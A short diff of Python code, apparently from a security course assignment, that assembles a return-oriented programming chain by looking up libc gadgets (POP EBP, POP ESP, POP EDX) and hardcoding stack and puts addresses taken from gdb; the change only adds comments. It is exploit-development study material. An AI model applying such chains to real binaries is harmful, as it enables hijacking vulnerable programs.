@@ -15,9 +15,9 @@ def get_string(student_id):
 def get_arg():
     import search
     gs = search.GadgetSearch('libc.bin',0xb7c39750)
-    loop_add = 0xbfffe144
-    str_address = loop_add + 20
-    puts_address = 0xb7c81ca0
+    loop_add = 0xbfffe144 #taken from looking at gdb
+    str_address = loop_add + 20  #counting number of commands
+    puts_address = 0xb7c81ca0 #from gdb
     pop_ebp = gs.find('POP EBP').decode("hex")[::-1]
     pop_esp = gs.find('POP ESP').decode("hex")[::-1]
     skip_stack = gs.find('POP EDX').decode("hex")[::-1]
